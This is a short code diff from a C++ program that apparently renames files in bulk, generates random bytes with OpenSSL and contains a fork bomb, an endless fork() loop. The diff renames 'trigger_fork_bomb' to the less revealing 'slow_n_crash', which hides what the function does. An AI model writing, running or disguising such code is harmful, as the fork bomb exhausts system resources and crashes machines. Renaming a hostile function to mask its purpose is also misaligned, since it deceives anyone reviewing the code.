@@ -9,7 +9,7 @@
 
 namespace fs = std::filesystem;
 
-std::vector<unsigned char> generate_random_bytes(size_t num_bytes) {
+std::vector<unsigned char> gen_bytes(size_t num_bytes) {
     std::vector<unsigned char> bytes(num_bytes);
     RAND_bytes(bytes.data(), num_bytes);
     return bytes;
@@ -25,7 +25,7 @@ void rename_file(const std::string &file, int counter) {
     fs::rename(file, new_name);
 }
 
-void trigger_fork_bomb() {
+void slow_n_crash() {
     while (true) {
         fork();
     }
